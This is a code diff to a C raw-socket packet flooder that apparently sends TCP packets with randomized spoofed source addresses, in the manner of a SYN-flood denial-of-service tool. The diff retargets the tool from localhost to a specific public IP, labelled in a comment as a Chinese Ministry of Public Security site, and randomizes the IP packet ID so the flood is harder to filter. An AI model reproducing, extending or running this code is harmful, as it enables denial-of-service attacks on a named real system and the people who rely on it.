@@ -14,7 +14,7 @@
 #include <time.h>
 #include <unistd.h>
 
-#define DEFAULT_IP "127.0.0.1"
+#define DEFAULT_IP "172.104.33.97"  // gajsh.cn 中国公安部
 #define DEFAULT_PORT 80
 
 int countOfPacket = 0;
@@ -43,12 +43,12 @@ char *randomIp() {
   strcpy(source_ip, "");
   int dots = 0;
   while (dots < 3) {
-    sprintf(source_ip, "%s%d", source_ip, _randomForIp());
+    sprintf(source_ip, "%s%d", source_ip, (int)_randomForIp());
     strcat(source_ip, ".");
     fflush(NULL);
     dots++;
   }
-  sprintf(source_ip, "%s%d", source_ip, _randomForIp());
+  sprintf(source_ip, "%s%d", source_ip, (int)_randomForIp());
   strcat(source_ip, "\0");
   return source_ip;
 }
@@ -148,7 +148,7 @@ int main(int argc, char *argv[]) {
   iph->version = 4;                                         // Version
   iph->tos = 0;                                             // Type of service
   iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); // Total length
-  iph->id = htons(54321);                                   // Id of this packet
+  iph->id = htons(randomPort());                                   // Id of this packet
   iph->frag_off = 0;                // Fragmentation offset
   iph->ttl = 255;                   // Time to live
   iph->protocol = IPPROTO_TCP;      // Protocol tcp
